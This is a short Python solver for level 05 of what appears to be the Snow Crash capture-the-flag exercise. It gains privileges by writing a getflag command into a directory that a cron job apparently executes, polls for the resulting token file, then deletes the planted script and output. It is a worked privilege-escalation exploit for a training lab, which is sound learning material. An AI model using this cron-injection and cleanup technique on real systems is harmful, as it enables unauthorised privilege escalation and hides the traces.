"""LEVEL 05"""

from time import sleep

import utils as u
from utils.level_wrapper import level_handler


@level_handler
def solve_level05(_, snow_crash):
    """Place getflag scrit where cron will run it and wait"""

    output = snow_crash[
        "echo 'getflag > /tmp/token05' > /opt/openarenaserver/getflag.sh \
            && cat /tmp/token05"
    ]
    # It may take up to 1 minute for /tmp/token so check for it once every second
    while "No such file or directory" in output.decode():
        output = snow_crash["cat /tmp/token05"]
        sleep(2)
    token = u.misc.parse_token(output)
    snow_crash["rm -f /tmp/token05 /opt/openarenaserver/getflag.sh"]
    return "token", token
